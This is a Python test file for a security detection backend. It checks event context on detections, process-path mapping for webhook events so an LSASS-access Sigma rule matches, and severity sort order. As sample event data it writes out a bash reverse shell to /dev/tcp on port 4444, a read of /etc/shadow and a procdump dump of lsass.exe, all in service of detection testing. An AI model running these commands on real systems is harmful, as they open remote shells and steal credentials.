"""Detections as the pipeline writes them and as the Detections page sorts them.

Found while driving the real UI against the real backend:

  - A detection carried no user, process or log source, so the panel could not
    show what had triggered it.
  - A webhook event had no field for the process path, so the bundled LSASS
    rule (``path|endswith``) and every ``Image`` condition could not match it.
  - Sorting detections by severity compared the names: "high" < "low" < "medium".
"""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

from app.engine.sigma_engine import SigmaEngine
from app.repositories.detection_repo import DetectionRepo
from app.services.alert_manager import AlertManager
from app.services.normalizers.ocsf import OCSFClass
from app.services.normalizers.webhook import WebhookNormalizer

RULES_DIR = Path(__file__).resolve().parents[2] / "sigma_rules"
LSASS_RULE_ID = "0d894093-71bc-43c3-b7e0-01eb5adf38cd"


# ── Event context on the detection ────────────────────────────────────────────


def test_event_context_takes_user_command_line_and_source() -> None:
    snapshot = {
        "actor_user.name": "alice",
        "process.cmd_line": "cat /etc/shadow",
        "process.name": "cat",
        "unmapped.source": "lab-webhook",
        "_product": "webhook",
    }
    assert AlertManager._event_context(snapshot) == {
        "user": "alice", "process": "cat /etc/shadow", "log_source": "lab-webhook",
    }


def test_event_context_falls_back_and_skips_empty_values() -> None:
    snapshot = {
        "actor_user.name": None,
        "process.cmd_line": "  ",
        "process.path": None,
        "process.name": "sshd",
        "_product": "syslog",
        "unmapped.source": ["not", "a", "scalar"],
    }
    assert AlertManager._event_context(snapshot) == {
        "user": None, "process": "sshd", "log_source": "syslog",
    }
    assert AlertManager._event_context({}) == {"user": None, "process": None, "log_source": None}


def test_event_context_fits_the_columns() -> None:
    context = AlertManager._event_context({
        "actor_user.name": "u" * 400, "process.cmd_line": "c" * 900, "_product": "p" * 300,
    })
    assert (len(context["user"]), len(context["process"]), len(context["log_source"])) == (255, 500, 100)


async def test_persisted_detection_carries_the_event_context() -> None:
    with patch("app.services.alert_manager.aioredis"):
        manager = AlertManager(MagicMock())
    scored = {
        "id": "8f0f5f0e-5d0c-4c57-9d1b-5c1f6d3e2a10",
        "score": 5.8,
        "level": "high",
        "rule_id": "ec09518a-b81b-4fe5-9bdf-dd9fc96c01e2",
        "rule_title": "Reverse Shell Command Line",
        "technique_ids": ["T1059.004"],
        "tactic_ids": ["TA0002"],
        "host": "web-01.example.org",
        "time": "2026-11-24T14:28:48+00:00",
        "event_snapshot": {
            "actor_user.name": "alice",
            "process.cmd_line": "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1",
            "unmapped.source": "lab-webhook",
        },
    }
    session_cm = MagicMock()
    session_cm.__aenter__ = AsyncMock(return_value=AsyncMock())
    session_cm.__aexit__ = AsyncMock(return_value=False)

    with (
        patch("app.core.database.AsyncSessionLocal", return_value=session_cm),
        patch("app.repositories.detection_repo.DetectionRepo.create", new=AsyncMock()) as create,
        patch.object(manager, "_correlate_incident", new=AsyncMock()),
    ):
        await manager._persist_to_db(scored)

    kwargs = create.await_args.kwargs
    assert kwargs["user"] == "alice"
    assert kwargs["process"] == "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1"
    assert kwargs["log_source"] == "lab-webhook"


# ── Process path of a webhook event ───────────────────────────────────────────


def test_webhook_process_path_is_mapped() -> None:
    for key in ("process_path", "image", "exe"):
        event = WebhookNormalizer().normalize({key: r"C:\Windows\System32\lsass.exe", "host": "ws-07"})
        assert event.process.path == r"C:\Windows\System32\lsass.exe"
        assert event.class_uid == OCSFClass.PROCESS_ACTIVITY
        assert key not in event.unmapped


async def test_bundled_lsass_rule_matches_a_webhook_event() -> None:
    engine = SigmaEngine()
    rule = engine.load_rule_yaml((RULES_DIR / "lsass_memory_access.yml").read_text(encoding="utf-8"))
    assert rule is not None
    engine.add_rule(rule)
    event = WebhookNormalizer().normalize({
        "_webhook_source": "lab-webhook",
        "host": "win-ws-07.example.org",
        "os": "windows",
        "user": "dave",
        "process": "procdump.exe",
        "process_path": r"C:\Windows\System32\lsass.exe",
        "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
    })

    alerts = [alert async for alert in engine.evaluate(event)]

    assert [alert.rule_id for alert in alerts] == [LSASS_RULE_ID]
    assert alerts[0].level == "critical"


# ── Sort order of the Detections page ─────────────────────────────────────────


async def _add(session, severity: str, minutes_ago: int, host: str = "h") -> None:
    await DetectionRepo.create(
        session, score=5.0, severity=severity, technique_id="T1059", technique_name="x",
        tactic="Execution", name=f"{severity}-{minutes_ago}", host=host,
        time=datetime(2026, 11, 24, 12, 0, tzinfo=UTC) - timedelta(minutes=minutes_ago),
    )


async def test_severity_sort_is_by_rank_not_by_name(db_session) -> None:
    for i, severity in enumerate(["medium", "low", "critical", "high"]):
        await _add(db_session, severity, i)

    desc, _ = await DetectionRepo.list(db_session, sort="severity", order="desc")
    asc, _ = await DetectionRepo.list(db_session, sort="severity", order="asc")

    assert [d.severity for d in desc] == ["critical", "high", "medium", "low"]
    assert [d.severity for d in asc] == ["low", "medium", "high", "critical"]


async def test_equal_sort_values_keep_one_order_across_pages(db_session) -> None:
    for i in range(7):
        await _add(db_session, "high", i)

    pages = []
    for page in (1, 2, 3):
        items, total = await DetectionRepo.list(db_session, sort="severity", order="desc", page=page, page_size=3)
        pages.extend(d.name for d in items)

    assert total == 7
    # Newest first within the same severity, and no row twice or missing.
    assert pages == [f"high-{i}" for i in range(7)]
